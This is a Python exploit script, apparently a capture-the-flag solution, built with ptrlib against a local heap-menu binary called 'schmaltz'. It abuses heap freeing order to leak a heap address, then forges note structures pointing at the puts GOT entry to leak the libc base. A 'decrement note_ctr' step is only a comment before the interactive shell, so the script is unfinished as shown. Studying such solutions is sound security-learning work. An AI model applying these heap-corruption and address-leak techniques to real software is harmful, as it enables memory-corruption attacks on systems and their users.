from ptrlib import *

def add(size, data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(size))
    if size > 0:
        sock.sendafter("> ", data)
    return

def view(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", str(index))
    sock.recvuntil("Content: ")
    return sock.recvline()

def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("> ", str(index))
    return

def offset(address):
    assert address % 0x10 == 0
    return (address - 0x602060) // 0x10

libc = ELF("./libc.so.6")
elf = ELF("./schmaltz")
sock = Process("./schmaltz", env={"LD_LIBRARY_PATH": "./"})

# leak heap address
add(0x28, "A") # 0
add(0x28, "B") # 1
delete(1)
delete(0)
add(0x28, "\x60") # 0
addr_heap = u64(view(0))
logger.info("addr_heap = " + hex(addr_heap))

# leak libc address
fake_note  = b'A' * 0x10
fake_note += p64(elf.got("puts")) + p32(0x18) + p32(1)
delete(0)
add(0x28, fake_note) # 0
fake  = b'A' * 0x10
fake += p64(addr_heap + 0x90) + p32(0x08) + p32(1)
fake += p64(0) + p64(0x41)
fake += p64(0) + p64(elf.symbol("note_ctr"))
add(0x1f1, fake) # 1
delete(2)
delete(1)
delete(0)
libc_base = u64(view(offset(addr_heap + 0x10))) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

# decrement note_ctr

sock.interactive()
